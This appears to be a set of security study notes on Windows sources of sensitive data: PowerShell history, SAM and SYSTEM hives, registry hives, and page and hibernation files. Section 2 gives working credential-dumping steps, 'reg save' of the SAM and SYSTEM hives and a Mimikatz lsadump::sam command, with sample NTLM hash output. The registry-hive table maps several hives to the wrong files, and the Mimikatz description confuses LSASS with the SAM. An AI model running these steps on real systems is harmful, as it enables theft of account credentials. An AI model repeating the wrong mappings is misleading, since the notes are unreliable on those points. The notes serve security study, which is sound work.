
---
## **1. History Logs**

Windows stores command history, which can reveal sensitive information.

### **1.1 PowerShell History**

- View history in memory:
    
    ```powershell
    Get-History
    ```
    
- Find where history is stored:
    
    ```powershell
    (Get-PSReadlineOption).HistorySavePath
    ```
    
- Default location:
    
    ```
    %UserProfile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    
    In Linux
    
    $HOME/.local/share/powershell/PSReadLine/ConsoleHost_history.txt
    ```


### **1.2 PowerShell Transcripts**

PowerShell transcripts log executed commands, posing a security risk.

- Start logging:
    
    ```powershell
    Start-Transcript -Path "C:\Users\Public\log.txt"
    ```
    
- Stop logging:
    
    ```powershell
    Stop-Transcript
    ```
    

---

## **2. Security Accounts Manager (SAM + SYSTEM)**

The **SAM** file stores **user credentials and hashes**, while the **SYSTEM** file contains encryption keys used to decrypt them.

The SAM file contains various things, including 
- Usernames and password hashes 
- Account Information 
- Security Identifiers (SIDs) 
- Group Memberships

The SAM file is located in the directory
==C:\Windows\System32\**config**==
### **2.1 Dumping SAM with `SeBackupPrivilege`**

The `SeBackupPrivilege' is a system privilege that allows users or` services to back up files. Since some files are locked for various reasons, the privilege allows users or services to bypass normal file security restrictions.

Users with **SeBackupPrivilege** can extract **SAM and SYSTEM** files.

- Assign privilege:
    
    ```powershell
    Add-LocalGroupMember -Group "Backup Operators" -Member "User"
    ```
    
- Dump the files:
    
    ```powershell
    reg save hklm\sam C:\Users\Public\SAM.hive
    reg save hklm\system C:\Users\Public\SYSTEM.hive
    ```
    

### **2.2 Extracting Hashes with Mimikatz**

We can use `mimikatz' to dump the hashes saved within the Local` Security Authority Subsystem Service (LSASS).

- Dump SAM hashes:
    
    ```powershell
    ./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
    ```
     
- Example output:
    
    ```
    RID  : 000003e8 (1000)
    User : AdminUser
      Hash NTLM: 2b576acbe6bcfda7294d6bd18041b8fe
    ```
    

---

## **3. Registry Hives**

The Windows registry is a hierarchical database structured following a tree-like data structure into `registry hives'.`

Windows **Registry Hives** contain critical system and user information.

|Hive|Path|
|---|---|
|**HKCR** (Classes Root)|`C:\Windows\System32\Config\Software`|
|**HKLM** (Local Machine)|`C:\Windows\System32\Config\SYSTEM`|
|**HKU** (Users)|`C:\Windows\System32\Config\DEFAULT`|
|**HKCU** (Current User)|`C:\Users\<UserName>\NTUSER.DAT`|
|**HKCC** (Current Config)|`C:\Windows\System32\Config\SystemProfile`|

### **Extracting Registry Data with `regipy`**

- Install `regipy`:
    
    ```bash
   python3 -m venv venv
   . venv/bin/activate
    pip install regipy
    ```
    
- Python script to explore registry:
    
    ```python
    from regipy.registry import RegistryHive
    
    def list_registry_keys(hive_path):
        hive = RegistryHive(hive_path)
        for entry in hive.recurse_subkeys(as_json=True):
            print(entry)
    
    list_registry_keys("./SYSTEM")
    ```
    

---

## **4. Extra Sources of Sensitive Data**

### **4.1 Configuration Files**

Applications store sensitive data in:

```
%AppData%
%LocalAppData%
```

### **4.2 Paging File (`pagefile.sys`)**

Contains memory dumps, potential sensitive data.

```
C:\pagefile.sys
```

### **4.3 Hibernation File (`hiberfil.sys`)**

Stores **RAM contents** when the system hibernates.

```
C:\hiberfil.sys
```

---

## **5. References**

- **Mimikatz**: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
    
- **Regipy**: [https://github.com/mkorman90/regipy](https://github.com/mkorman90/regipy)
    

---

